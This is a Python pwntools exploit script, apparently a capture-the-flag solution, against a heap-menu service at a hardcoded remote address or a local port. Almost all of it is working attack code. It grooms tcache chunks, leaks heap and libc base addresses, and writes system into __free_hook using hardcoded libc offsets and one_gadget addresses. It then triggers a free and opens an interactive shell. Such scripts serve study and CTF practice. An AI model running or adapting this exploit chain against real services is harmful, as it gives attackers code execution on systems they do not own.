from __future__ import division, print_function
import random
from pwn import *
import argparse
import time


context.log_level = 'error'

parser = argparse.ArgumentParser()
parser.add_argument(
        "--host",
        default="127.0.0.1",
        help="target host"
        )
parser.add_argument(
        "--port",
        default=3001,
        help="target port"
        )
parser.add_argument(
        '--log',
        action='store_true'
        )
parser.add_argument(
        '--is-gaibu',
        action='store_true'
        )
args = parser.parse_args()


log = args.log
is_gaibu = args.is_gaibu
if is_gaibu:
    host = "69.90.132.248"
    port = 1337
else:
    host = args.host
    port = args.port

def wait_for_attach():
    if not is_gaibu:
        print('attach?')
        raw_input()

def just_u64(x):
    return u64(x.ljust(8, '\x00'))

r = remote(host, port)

def recvuntil(x, verbose=True):
    s = r.recvuntil(x)
    if log and verbose:
        print(s)
    return s.strip(x)

def recv(n, verbose=True):
    s = r.recv(n)
    if log and verbose:
        print(s)
    return s

def recvline(verbose=True):
    s = r.recvline()
    if log and verbose:
        print(s)
    return s.strip('\n')

def sendline(s, verbose=True):
    if log and verbose:
        pass
        #print(s)
    r.sendline(s)

def send(s, verbose=True):
    if log and verbose:
        print(s, end='')
    r.send(s)

def interactive():
    r.interactive()

####################################

def menu(choice):
    recvuntil(':')
    sendline(str(choice))

# receive and send
def rs(s, new_line=True, r=':'):
    recvuntil(r)
    s = str(s)
    if new_line:
        sendline(s)
    else:
        send(s)

def new(idx, size):
    rs(1)
    rs(idx)
    rs(size)
    recvuntil('[+] new: OK!')

def edit(idx, data):
    rs(2)
    rs(idx)
    rs(data, new_line=False)
    recvuntil('[+] edit: OK!')

def copy(frm, to):
    rs(3)
    rs(frm)
    rs(to)
    recvuntil('[+] copy: OK!')

def data_print(idx):
    rs(4)
    rs(idx)
    recvuntil('[+] print: ')
    return recvuntil('\nCh')

def delete(idx):
    rs(5)
    rs(idx)
    recvuntil('[+] delete: OK!')


#new(4, 0)

size = 16
new(0, size)
new(1, size)
new(2, size)

for i in range(4):
    new(i, 0xff)
for i in range(4):
    new(i, 0xa0)
for i in range(4):
    new(i, 0x80)
for i in range(4):
    delete(3 - i)

new(0, size)
copy(0, 0)
heap_base = just_u64(data_print(0)) - 0x10
print(hex(heap_base))

delete(0)
new(0, size)
copy(0, 0)
copy(0, 1)
new(2, 0x40)
new(3, size)
new(4, size)

edit(4, "A" * 6 + p64(0) + '\x61\x09')
delete(0)

libc_base = just_u64(data_print(1)) - 0x1ebbe0
#(0xb0)   tcache_entry[9](4): 0x55ed56c6a950 --> 0x55ed56c6a8a0 --> 0x55ed56c6a7f0 --> 0x55ed56c6a740

print(hex(libc_base))
size = 0xa0
new(0, size)
copy(0, 0)
new(2, size)
new(3, size)
edit(3, "A" * 7 + p64(0) * ((size - 8) // 8) + '\xf0')
delete(2)

# 3,4: dame

free_hook = libc_base + 0x1eeb28
malloc_hook = libc_base + 0x1ebb70
system = libc_base + 0x55410

gadgets = [0xe6e73, 0xe6e76, 0xe6e79, 0xe6b4e, 0x8731c, 0x54fe2]
one_gadget = libc_base + gadgets[4]

addr = free_hook
target = system

new(1, 0xe0)
edit(1, 'A' * 0xa8 + p64(addr - 8))

new(2, 0x80)
edit(1, 'A' * 0xa8 + "th;\x00" + '\xff' * 4)
new(1, 0x80)
edit(1, p64(target))
wait_for_attach()

rs(5)
rs(2)

interactive()

